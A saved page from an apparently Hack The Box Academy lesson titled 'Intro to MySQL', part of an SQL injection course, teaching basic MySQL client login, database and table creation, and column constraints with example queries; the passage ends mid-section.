<body data-layout="detached" data-topbar="colored">
    <div id="global-alert-notification" class="global-alert-banner-container">
    <div class="alert-notification-banner global warning">
        <div class="d-flex justify-content-between w-100 h-100 alert-body">
            <div class="d-flex align-items-center justify-content-center">
                <div class="warning global-icon-wrapper align-self-center">
                    <i class="fa fa-exclamation-circle"></i>
                </div>
                <p class="alert-body-content d-flex flex-column justify-content-center mb-0">
                    <span class="title warning">HTB CPTS Attempts Blocked Starting May 18, 2025</span>
                    <span class="message warning">HTB CPTS exam lab updates may last up to 10 days. Retake users will be issued new vouchers.</span>
                </p>
            </div>
                    </div>
    </div>
</div>
<div class="container-fluid">
    <htb-note base-url="https://notes.prod.htb.systems"></htb-note>
    <div id="layout-wrapper" class="global-alert-visible">

        <header id="page-topbar" class="global-alert-visible">
    <div class="navbar-header">
        <div class="container-fluid">
            <div class="d-flex align-items-center justify-content-between">
                <div class="d-flex align-items-center">
                    <div class="navbar-brand-box">
                        <a href="https://academy.hackthebox.com/dashboard" class="logo">
                            <span class="logo-sm">
                                <img src="/images/new-logo-htb.svg" alt="" height="30">
                            </span>
                            <span class="logo-md">
                                <img src="/images/logo.svg" alt="" height="30">
                            </span>
                            <span class="logo-lg">
                                <img src="/images/logo.svg" alt="" height="36">
                            </span>
                        </a>
                    </div>

                    <div class="d-flex align-items-center">
                        <button type="button" class="btn btn-sm font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn">
                            <i class="fa fa-fw fa-bars"></i>
                        </button>
                                            </div>
                                        <div class="topnav">
                        <nav class="navbar navbar-light navbar-expand-lg topnav-menu">
                            <div class="collapse navbar-collapse" id="topnav-menu-content">
                                <ul class="navbar-nav active">
                                    <li class="nav-item">
                                        <a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
                                    </li>
                                    <li class="nav-item">
                                        <a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
                                            Modules</a>
                                    </li>
                                    <li class="nav-item">
                                        <a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
                                    </li>
                                </ul>
                            </div>
                        </nav>
                    </div>
                                    </div>

                <div class="float-right">
                    <a class="btn noti-icon d-none d-lg-inline-block" data-toggle="tooltip" data-title="Changelog" href="https://roadmap.hackthebox.com/changelog?labels=academy" rel="noopener" target="_blank" data-original-title="" title="">
                        <img src="/images/icons/ic-canny.svg" class="d-xl-inline-block" width="28" height="28">
                    </a>
                    <div class="dropdown d-none d-lg-inline-block ml-1">
                        <a href="https://academy.hackthebox.com/billing">
                            <button type="button" class="btn btn-extra-light">
                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;Purchase Cubes
                            </button>
                        </a>
                    </div>
                    <div class="dropdown d-none d-lg-inline-block ml-1">
                        <button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
                            <i class="mdi mdi-fullscreen fullscreen-icon"></i>
                        </button>
                    </div>


                    <div class="dropdown d-inline-block">
                        <button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <img class="rounded-circle header-profile-user" src="https://www.gravatar.com/avatar/1d43442f05373d37bbf88100722f690b?d=robohash" alt="Header Avatar">
                            <span class="d-none d-xl-inline-block ml-1">hurusio</span>
                            <i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
                        </button>
                        <div class="dropdown-menu dropdown-menu-right">
                                                        <a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 mr-1 align-middle"></i> Billing</a>
                            <a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 mr-1 align-middle"></i> Settings</a>
                            <a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 mr-1 align-middle"></i> VPN Settings</a>
                            <div class="dropdown-divider"></div>
                            <form method="POST" action="https://academy.hackthebox.com/logout"> <input type="hidden" name="_token" value="NCvNHM6p2yXAC4ivrS5c20eqvDEScRMvGCtTZrEC" autocomplete="off"> <a class="dropdown-item text-danger log-out" href="#"><i class="bx bx-power-off font-size-16 text-danger mr-1 align-middle"></i> Logout</a>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</header>

        <div class="vertical-menu overflow-hidden  d-lg-none   global-alert-visible ">
    <div class="vertical-menu-overlay"></div>
    <div class="h-100 overflow-auto">
        <div class="user-wid text-center py-4">
            <div class="user-img">
                <img src="https://www.gravatar.com/avatar/1d43442f05373d37bbf88100722f690b?d=robohash" alt="" class="avatar-md mx-auto rounded-circle">
            </div>

            <div class="mt-3">
                <p class="text-dark mb-0 font-weight-medium font-size-16">hurusio</p>
                                <p class="text-body mt-1 mb-1">
                                                                        Silver Annual
                                                            </p>
                <p>
                    <span class="custom-badge custom-badge-soft-secondary" data-toggle="tooltip" data-title="Cubes" data-original-title="" title="">
                        <i class="fad fa-cube text-success mr-1"></i>
                        <span class="cubeBalance">
                                                            407
                                                    </span>
                    </span>
                                        <span class="custom-badge custom-badge-soft-secondary cursor-pointer exchange-voucher" data-toggle="tooltip" data-title="Vouchers" data-original-title="" title="">
                        <i class="fad fa-ticket text-success mr-1"></i>
                        <span class="voucherBalance">
                            1
                        </span>
                    </span>
                                    </p>
            </div>
        </div>

        <div id="sidebar-menu">
    <ul class="metismenu list-unstyled" id="side-menu">

        <li class="menu-title">Learn</li>

        <li><a class="navDashboard" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a></li>

                <li>
            <a class="navDashboard" href="https://academy.hackthebox.com/exams"><i class="mdi mdi-certificate"></i>
                Exams</a></li>
        <li>
            <a class="navModules" href="javascript: void(0);" aria-expanded="false">
                <i class="mdi mdi-book-open"></i>
                <span>Modules</span>
            </a>
            <ul class="sub-menu mm-collapse" aria-expanded="false">
                <li><a href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i> All Modules</a>
                </li>
                <li>
                    <a href="https://academy.hackthebox.com/modules/inprogress"><i class="mdi mdi-progress-upload"></i>
                        In-Progress Modules</a></li>
                <li><a href="https://academy.hackthebox.com/modules/locked"><i class="mdi mdi-account-arrow-left-outline"></i> Available
                        Modules</a>
                </li>
                <li>
                    <a href="https://academy.hackthebox.com/modules/unlocked"><i class="mdi mdi-account-check-outline"></i>
                        Owned
                        Modules</a></li>
                <li>
                    <a href="https://academy.hackthebox.com/modules/changelog"><i class="mdi mdi-playlist-check"></i>
                        Change Log</a></li>
                            </ul>
        </li>
        <li class="pathsLink">
            <a class="navPaths" href="javascript: void(0);" aria-expanded="false">
                <i class="mdi mdi-map-marker-path"></i>
                <span>Paths</span>
            </a>
            <ul class="sub-menu mm-collapse" aria-expanded="false">
                <li class="skillPathsLink"><a href="https://academy.hackthebox.com/paths"><i class="mdi mdi-chart-line-variant"></i> Skill Paths</a></li>
                                    <li class="jobRolePathsLink"><a href="https://academy.hackthebox.com/paths/jobrole"><i class="mdi mdi-briefcase"></i> Job Role Paths</a></li>
                            </ul>
        </li>
        <li>
            <a class="navDashboard" href="https://academy.hackthebox.com/academy-relations"><i class="mdi mdi-sitemap"></i>
                Academy x HTB Labs</a>
        </li>
        <li class="menu-title">My Achievements</li>
        <li>
            <a class="navDashboard" href="https://academy.hackthebox.com/my-certificates"><i class="mdi mdi-certificate"></i>
                My Certificates </a></li>
        <li>
                    </li><li>
                <a class="navDashboard" href="https://academy.hackthebox.com/my-badges"><i class="mdi mdi-trophy"></i>
                    My Badges                         <span class="badge badge-primary float-right">  5</span></a>
            </li>
                <li>

                    </li><li class="menu-title">Referrals</li>
                <li>
                    <a class="navDashboard" href="https://academy.hackthebox.com/referral">
                        <i class="mdi mdi-gift"></i> Invite friends
                                                    <span class="badge bg-success text-light font-size-11 mx-3">NEW</span>
                                            </a>
                </li><li>
            </li><li>
                </li><li class="menu-title">Get Help</li>
        <li>
            <a class="navSupport" href="http://help.hackthebox.eu/" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-help-box"></i>Help Center</a></li>
        <li><a class="navSupport" data-toggle="tooltip" href="https://academy.hackthebox.com/faq" data-original-title="" title=""><i class="mdi mdi-help-circle"></i> FAQ</a></li>
        <li>
            <a class="navSupport" href="https://roadmap.hackthebox.com/changelog?labels=academy" rel="noopener" target="_blank">
                <img src="/images/icons/ic-canny.svg" class="d-xl-inline-block" width="28" height="25">
                Changelog
            </a>
        </li>
        <li><a class="navSupport" href="https://discord.gg/hackthebox" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-discord"></i>
                Discord</a></li>

    </ul>
</div>

    </div>
</div>

        <div class="vertical-menu overflow-hidden  d-lg-none   global-alert-visible ">
    <div class="vertical-menu-overlay"></div>
    <div class="h-100 overflow-auto">
        <div class="user-wid text-center py-4">
            <div class="user-img">
                <img src="https://www.gravatar.com/avatar/1d43442f05373d37bbf88100722f690b?d=robohash" alt="" class="avatar-md mx-auto rounded-circle">
            </div>

            <div class="mt-3">
                <p class="text-dark mb-0 font-weight-medium font-size-16">hurusio</p>
                                <p class="text-body mt-1 mb-1">
                                                                        Silver Annual
                                                            </p>
                <p>
                    <span class="custom-badge custom-badge-soft-secondary" data-toggle="tooltip" data-title="Cubes" data-original-title="" title="">
                        <i class="fad fa-cube text-success mr-1"></i>
                        <span class="cubeBalance">
                                                            407
                                                    </span>
                    </span>
                                        <span class="custom-badge custom-badge-soft-secondary cursor-pointer exchange-voucher" data-toggle="tooltip" data-title="Vouchers" data-original-title="" title="">
                        <i class="fad fa-ticket text-success mr-1"></i>
                        <span class="voucherBalance">
                            1
                        </span>
                    </span>
                                    </p>
            </div>
        </div>

        <div id="sidebar-menu">
    <ul class="metismenu list-unstyled" id="side-menu">

        <li class="menu-title">Learn</li>

        <li><a class="navDashboard" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a></li>

                <li>
            <a class="navDashboard" href="https://academy.hackthebox.com/exams"><i class="mdi mdi-certificate"></i>
                Exams</a></li>
        <li>
            <a class="navModules" href="javascript: void(0);">
                <i class="mdi mdi-book-open"></i>
                <span>Modules</span>
            </a>
            <ul class="sub-menu mm-collapse" aria-expanded="false">
                <li><a href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i> All Modules</a>
                </li>
                <li>
                    <a href="https://academy.hackthebox.com/modules/inprogress"><i class="mdi mdi-progress-upload"></i>
                        In-Progress Modules</a></li>
                <li><a href="https://academy.hackthebox.com/modules/locked"><i class="mdi mdi-account-arrow-left-outline"></i> Available
                        Modules</a>
                </li>
                <li>
                    <a href="https://academy.hackthebox.com/modules/unlocked"><i class="mdi mdi-account-check-outline"></i>
                        Owned
                        Modules</a></li>
                <li>
                    <a href="https://academy.hackthebox.com/modules/changelog"><i class="mdi mdi-playlist-check"></i>
                        Change Log</a></li>
                            </ul>
        </li>
        <li class="pathsLink">
            <a class="navPaths" href="javascript: void(0);">
                <i class="mdi mdi-map-marker-path"></i>
                <span>Paths</span>
            </a>
            <ul class="sub-menu mm-collapse" aria-expanded="false">
                <li class="skillPathsLink"><a href="https://academy.hackthebox.com/paths"><i class="mdi mdi-chart-line-variant"></i> Skill Paths</a></li>
                                    <li class="jobRolePathsLink"><a href="https://academy.hackthebox.com/paths/jobrole"><i class="mdi mdi-briefcase"></i> Job Role Paths</a></li>
                            </ul>
        </li>
        <li>
            <a class="navDashboard" href="https://academy.hackthebox.com/academy-relations"><i class="mdi mdi-sitemap"></i>
                Academy x HTB Labs</a>
        </li>
        <li class="menu-title">My Achievements</li>
        <li>
            <a class="navDashboard" href="https://academy.hackthebox.com/my-certificates"><i class="mdi mdi-certificate"></i>
                My Certificates </a></li>
        <li>
                    </li><li>
                <a class="navDashboard" href="https://academy.hackthebox.com/my-badges"><i class="mdi mdi-trophy"></i>
                    My Badges                         <span class="badge badge-primary float-right">  5</span></a>
            </li>
                <li>

                    </li><li class="menu-title">Referrals</li>
                <li>
                    <a class="navDashboard" href="https://academy.hackthebox.com/referral">
                        <i class="mdi mdi-gift"></i> Invite friends
                                                    <span class="badge bg-success text-light font-size-11 mx-3">NEW</span>
                                            </a>
                </li><li>
            </li><li>
                </li><li class="menu-title">Get Help</li>
        <li>
            <a class="navSupport" href="http://help.hackthebox.eu/" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-help-box"></i>Help Center</a></li>
        <li><a class="navSupport" data-toggle="tooltip" href="https://academy.hackthebox.com/faq" data-original-title="" title=""><i class="mdi mdi-help-circle"></i> FAQ</a></li>
        <li>
            <a class="navSupport" href="https://roadmap.hackthebox.com/changelog?labels=academy" rel="noopener" target="_blank">
                <img src="/images/icons/ic-canny.svg" class="d-xl-inline-block" width="28" height="25">
                Changelog
            </a>
        </li>
        <li><a class="navSupport" href="https://discord.gg/hackthebox" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-discord"></i>
                Discord</a></li>

    </ul>
</div>

    </div>
</div>

        <div class="main-content">

            <div class="page-content">

                <div class="iterminal d-none">
    <div id="appVue"><div class="row mb-5 mb-lg-2 page-head"><div class="col-12"><div class="page-title-box d-flex align-items-center justify-content-between pb-0"><h4 class="page-title mb-0 font-size-18"></h4><div class="page-title-right"><ol class="breadcrumb m-0"><li class="breadcrumb-item"><a href="javascript: void(0);">Pages</a></li><li class="breadcrumb-item active">  </li></ol></div></div></div></div><div class=""><div data-v-4e75c04e="" id="terminal" data-testid="terminal" class="it-terminal"><div data-v-4e75c04e="" class="it-header"><div data-v-4e75c04e="" class="is-flex is-full-height is-align-items-center px-3"><button data-v-4e75c04e="" class="button it-btn-cirle is-danger"><svg data-v-4e75c04e="" width="24px" height="24px" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M5 7.5C5 7.22386 5.22386 7 5.5 7H9.5C9.77614 7 10 7.22386 10 7.5C10 7.77614 9.77614 8 9.5 8H5.5C5.22386 8 5 7.77614 5 7.5Z" fill="#ffffff"></path></svg></button><button data-v-4e75c04e="" data-testid="maximize" class="button it-btn-cirle is-warning mx-1"><svg data-v-4e75c04e="" width="15px" height="15px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="none"><path stroke="#ffffff" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8V6a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v2M3 8v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V8M3 8h18"></path><path fill="#ffffff" d="M3 6a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v2H3V6z"></path></svg></button><button data-v-4e75c04e="" data-testid="fullheight" class="button it-btn-cirle is-success"><svg data-v-4e75c04e="" width="15px" height="15px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path opacity="0.15" d="M4 6C4 5.44771 4.44772 5 5 5H19C19.5523 5 20 5.44772 20 6V15C20 15.5523 19.5523 16 19 16H5C4.44772 16 4 15.5523 4 15V6Z" fill="#ffffff"></path><path d="M12 20H16M12 20H8M12 20V16M12 16H5C4.44772 16 4 15.5523 4 15V6C4 5.44771 4.44772 5 5 5H19C19.5523 5 20 5.44772 20 6V15C20 15.5523 19.5523 16 19 16H12Z" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button><p data-v-4e75c04e="" data-testid="terminal-title" class="is-size-14 has-text-weight-bold ml-2 has-text-info"> Integrated Terminal </p></div></div><div data-v-4e75c04e="" data-testid="terminal-panel" class="is-flex is-full-height is-align-items-center is-justify-content-center"><span data-v-4e75c04e="" class="loader"></span></div></div></div></div>
</div>

<div class="row">

    <div class="col-12">
        <div class="page-title-box d-flex align-items-center justify-content-between">
            <h4 class="page-title mb-0 font-size-18 letter-spacing-1-2">SQL Injection Fundamentals
                                &nbsp;
                <i style="cursor:pointer;" data-module-id="33" data-toggle="tooltip" data-title="Toggle To-Do" class="favouriteBtn  fa-sharp fa-solid  fa-heart text-danger" data-original-title="" title=""></i>
            </h4>

            <div class="page-title-right">
                <ol class="breadcrumb m-0">
                    <li class="breadcrumb-item"><a href="javascript: void(0);">Page 4</a></li>
                    <li class="breadcrumb-item active">Intro to MySQL</li>
                </ol>
            </div>
        </div>
    </div>
</div>

<div class="row justify-content-xl-center">
    <div class="col-md-12 col-xl-9 col-xxl-7">

        <div class="training-module">

            <h1>Intro to MySQL</h1>
<hr>
<p>This module introduces SQL injection through <code>MySQL</code>, and it is crucial to learn more about <code>MySQL</code> and SQL to understand how SQL injections work and utilize them properly. Therefore, this section will cover some of MySQL/SQL's basics and syntax and examples used within MySQL/MariaDB databases.</p>
<hr>
<h2>Structured Query Language (SQL)</h2>
<p>SQL syntax can differ from one RDBMS to another. However, they are all required to follow the <a href="https://en.wikipedia.org/wiki/ISO/IEC_9075" target="_blank" rel="noopener nofollow">ISO standard</a> for Structured Query Language. We will be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:</p>
<ul>
<li>Retrieve data</li>
<li>Update data</li>
<li>Delete data</li>
<li>Create new tables and databases</li>
<li>Add / remove users</li>
<li>Assign permissions to these users</li>
</ul>
<hr>
<h2>Command Line</h2>
<p>The <code>mysql</code> utility is used to authenticate to and interact with a MySQL/MariaDB database. The <code>-u</code> flag is used to supply the username and the <code>-p</code> flag for the password. The <code>-p</code> flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">hurusio@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -u root -p</span></span>

<span class="token output">Enter password: &lt;password&gt;
...SNIP...

mysql&gt; 
</span></code></pre></div></div>
<p>Again, it is also possible to use the password directly in the command, though this should be avoided, as it could lead to the password being kept in logs and terminal history:</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">hurusio@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -u root -p</span></span><span class="token output">&lt;password&gt;

...SNIP...

mysql&gt; 
</span></code></pre></div></div>
<div class="card bg-light">
    <div class="card-body">
        <p class="mb-0">Tip: There shouldn't be any spaces between '-p' and the password.</p>
    </div>
</div>
<p>The examples above log us in as the superuser, i.e.,"<code>root</code>" with the password "<code>password</code>," to have privileges to execute all commands. Other DBMS users would have certain privileges to which statements they can execute. We can view which privileges we have using the <a href="https://dev.mysql.com/doc/refman/8.0/en/show-grants.html" target="_blank" rel="noopener nofollow">SHOW GRANTS</a> command which we will be discussing later.</p>
<p>When we do not specify a host, it will default to the <code>localhost</code> server. We can specify a remote host and port using the <code>-h</code> and <code>-P</code> flags.</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">hurusio@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -u root -h docker.hackthebox.eu -P <span class="token number">3306</span> -p </span></span>

<span class="token output">Enter password: 
...SNIP...

mysql&gt; 
</span></code></pre></div></div>
<div class="card bg-light">
    <div class="card-body">
        <p class="mb-0">Note: The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.</p>
    </div>
</div>
<div class="card bg-light">
    <div class="card-body">
        <p class="mb-0">Note: To follow along with the examples, try to use the 'mysql' tool on your PwnBox to log in to the DBMS found in the question at the end of the section, using its IP and port. Use 'root' for the username and 'password' for the password.</p>
    </div>
</div>
<hr>
<h2>Creating a database</h2>
<p>Once we log in to the database using the <code>mysql</code> utility, we can start using SQL queries to interact with the DBMS. For example, a new database can be created within the MySQL DBMS using the <a href="https://dev.mysql.com/doc/refman/5.7/en/create-database.html" target="_blank" rel="noopener nofollow">CREATE DATABASE</a> statement.</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">mysql&gt; CREATE DATABASE users;

Query OK, 1 row affected (0.02 sec)
</span></code></pre></div></div>
<p>MySQL expects command-line queries to be terminated with a semi-colon. The example above created a new database named <code>users</code>. We can view the list of databases with <a href="https://dev.mysql.com/doc/refman/8.0/en/show-databases.html" target="_blank" rel="noopener nofollow">SHOW DATABASES</a>, and we can switch to the <code>users</code> database with the <code>USE</code> statement:</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">mysql&gt; SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql&gt; USE users;

Database changed
</span></code></pre></div></div>
<div class="card bg-light">
    <div class="card-body">
        <p class="mb-0">SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.</p>
    </div>
</div>
<hr>
<h2>Tables</h2>
<p>DBMS stores data in the form of tables. A table is made up of horizontal rows and vertical columns. The intersection of a row and a column is called a cell. Every table is created with a fixed set of columns, where each column is of a particular data type.</p>
<p>A data type defines what kind of value is to be held by a column. Common examples are <code>numbers</code>, <code>strings</code>, <code>date</code>, <code>time</code>, and <code>binary data</code>. There could be data types specific to DBMS as well. A complete list of data types in MySQL can be found <a href="https://dev.mysql.com/doc/refman/8.0/en/data-types.html" target="_blank" rel="noopener nofollow">here</a>. For example, let us create a table named <code>logins</code> to store user data, using the <a href="https://dev.mysql.com/doc/refman/8.0/en/creating-tables.html" target="_blank" rel="noopener nofollow">CREATE TABLE</a> SQL query:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> logins <span class="token punctuation">(</span>
    id <span class="token keyword">INT</span><span class="token punctuation">,</span>
    username <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    password <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    date_of_joining <span class="token keyword">DATETIME</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></div>
<p>As we can see, the <code>CREATE TABLE</code> query first specifies the table name, and then (within parentheses) we specify each column by its name and its data type, all being comma separated. After the name and type, we can specify specific properties, as will be discussed later.</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">mysql&gt; CREATE TABLE logins (
    -&gt;     id INT,
    -&gt;     username VARCHAR(100),
    -&gt;     password VARCHAR(100),
    -&gt;     date_of_joining DATETIME
    -&gt;     );
Query OK, 0 rows affected (0.03 sec)
</span></code></pre></div></div>
<p>The SQL queries above create a table named <code>logins</code> with four columns. The first column, <code>id</code> is an integer. The following two columns, <code>username</code> and <code>password</code> are set to strings of 100 characters each. Any input longer than this will result in an error. The <code>date_of_joining</code> column of type <code>DATETIME</code> stores the date when an entry was added.</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">mysql&gt; SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)
</span></code></pre></div></div>
<p>A list of tables in the current database can be obtained using the <code>SHOW TABLES</code> statement. In addition, the <a href="https://dev.mysql.com/doc/refman/8.0/en/describe.html" target="_blank" rel="noopener nofollow">DESCRIBE</a> keyword is used to list the table structure with its fields and data types.</p>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">mysql&gt; DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
</span></code></pre></div></div>
<h4>Table Properties</h4>
<p>Within the <code>CREATE TABLE</code> query, there are many <a href="https://dev.mysql.com/doc/refman/8.0/en/create-table.html" target="_blank" rel="noopener nofollow">properties</a> that can be set for the table and each column. For example, we can set the <code>id</code> column to auto-increment using the <code>AUTO_INCREMENT</code> keyword, which automatically increments the id by one every time a new item is added to the table:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">    id <span class="token keyword">INT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>
</code></pre></div></div>
<p>The <code>NOT NULL</code> constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the <code>UNIQUE</code> constraint to ensures that the inserted item are always unique. For example, if we use it with the <code>username</code> column, we can ensure that no two users will have the same username:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">    username <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
</code></pre></div></div>
<p>Another important keyword is the <code>DEFAULT</code> keyword, which is used to specify the default value. For example, within the <code>date_of_joining</code> column, we can set the default value to <a href="https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now" target="_blank" rel="noopener nofollow">Now()</a>, which in MySQL returns the current date and time:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">    date_of_joining <span class="token keyword">DATETIME</span> <span class="token keyword">DEFAULT</span> <span class="token function">NOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</code></pre></div></div>
<p>Finally, one of the most important properties is <code>PRIMARY KEY</code>, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the <code>id</code> column the <code>PRIMARY KEY</code> for this table:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">    <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
</code></pre></div></div>
<p>The final <code>CREATE TABLE</code> query will be as follows:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> logins <span class="token punctuation">(</span>
    id <span class="token keyword">INT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>
    username <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    password <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    date_of_joining <span class="token keyword">DATETIME</span> <span class="token keyword">DEFAULT</span> <span class="token function">NOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></div>
<div class="card bg-light">
    <div class="card-body">
